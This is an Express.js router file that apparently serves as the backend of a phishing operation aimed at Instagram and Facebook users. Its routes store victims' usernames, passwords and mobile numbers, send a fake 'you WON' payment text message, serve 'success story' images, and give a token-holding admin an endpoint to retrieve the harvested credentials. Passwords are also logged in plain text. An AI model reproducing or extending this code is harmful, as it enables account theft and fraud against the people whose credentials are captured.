const mongoose = require('mongoose');
const express = require('express');
const router = express.Router();
const fs = require('fs');

const bodyParser = require('body-parser');

let port = process.env.PORT || 80;

const { newLogin, updateMobile, responseToAdmin } = require('./database.js');
const { userid } = require('./confirm'); //this file is not responding on server work only on loclahost 
const { message } = require('./message');

router.use(function(req, res, next) {
    console.log(req.url, '@', Date.now(), 'from', req.ip)
    next()
})

router.use(bodyParser.json());
router.use(bodyParser.urlencoded({ extended: true }));

// give new id in response
// reqirements none
// web test: ok 
router.get('/databaseId', (req, res) => {
    var id = new mongoose.Types.ObjectId()
    console.log('new user id is :', id)
    res.status(200)
    res.json({ _id: id })
})

// save data like username and password in array form
// requirements :unique id,plateform:[instagram facebook],username,password
// web test: ok
router.post('/saveData', (req, res) => {
    id = req.body.id
    platform = req.body.platform
    username = req.body.username
    password = req.body.password
        // console.log(username, password)
    newLogin(platform, id, username, password, res)
        // save req to database

})

// save data of mobile number in array form
// requirements : predefine id ,plateform,mobile number from cookies and infut or hidden fiels
// web test: ok
router.post('/updateMobile', (req, res) => {
    id = req.body.id
    platform = req.body.platform
    mobile = req.body.mobile

    updateMobile(platform, id, mobile, res)
        // res.status(200)
        // res.send("OK")
})



router.get('/successStories', (req, res) => {
    let testFolder = "./public/images"
    let data = { url: fs.readdirSync(testFolder) }
    res.json(data).status(200);
})



// here to confirm user id
// web test: fail
router.get('/confirm/userid/:username', (req, res) => {
    console.log(req.params.username, 'checking If Exists')
    userid(req.params.username, res)
})

// here to confirm username and passswod  
// web test: fail
router.post('/confirm/user', (req, res) => {
    let username = req.body.username;
    let passswod = req.body.password;
    console.log(req.body.username, req.body.password)
    account(username, passswod, res)
})



// send message to user of sucess of login
// web test:ok
router.get('/message/:number', (req, res) => {
    // send message to user via funtion in file
    let mess = "\nCongratulations you WON !!\nYour payment will added in your account within next 48 working hours.";
    message(mess, req.params.number, res);
})


// this is for only admin to use saved data and also 
// modify to give user permition to see data at their own may be later
// web test:ok
let auths = [process.env.AUTH1, process.env.AUTH2]
router.get('/responseToAdmin/:auth/:platform/:username', (req, res) => {
    username = req.params.username;
    platform = req.params.platform;
    auth = req.params.auth
    if (auths.includes(auth)) {
        responseToAdmin(platform, username, res)
    } else {
        res.status(403)
        res.send("Permission denied wrong auth")
    }
})




// 404 responses post
router.post('*', (req, res) => {
    console.log('post page err', 404)
    res.status(404)
    res.send('man this wrong url check it again!!!!')
})

// 404 responses get
router.get('*', (req, res) => {
    console.log('get page err', 404)
    res.status(404)
    res.send('man this wrong url check it again!!!!')
})




module.exports = router;
